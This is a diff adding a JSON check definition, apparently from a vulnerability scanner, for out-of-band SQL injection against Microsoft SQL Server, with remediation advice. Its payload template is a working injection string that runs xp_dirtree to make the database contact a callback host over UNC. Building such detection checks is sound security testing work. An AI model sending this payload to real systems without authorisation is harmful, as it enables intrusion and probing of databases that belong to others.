@@ -1,0 +1,20 @@
+{
+  "id": "m2-inj-sqli-oob-mssql-xpdirtree",
+  "bug_class": "sqli",
+  "title": "Out-of-band SQL injection (MSSQL xp_dirtree UNC)",
+  "severity": "High",
+  "applies_when": {
+    "always": true
+  },
+  "insertion_kinds": [],
+  "oracle": {
+    "kind": "oob",
+    "payload_template": "';exec master..xp_dirtree '\\\\{callback}\\x';--"
+  },
+  "references": [
+    "CWE-89",
+    "CAPEC-7"
+  ],
+  "remediation": "Use parameterised queries so injected clauses cannot reach out-of-band sinks (xp_dirtree, LOAD_FILE over UNC, UTL_HTTP). Revoke the DB rights that enable network/file egress, and run the database on a least-privilege, egress-filtered account. The unique inbound callback proves injection.",
+  "payload_family": "oob-sqli-mssql"
+}
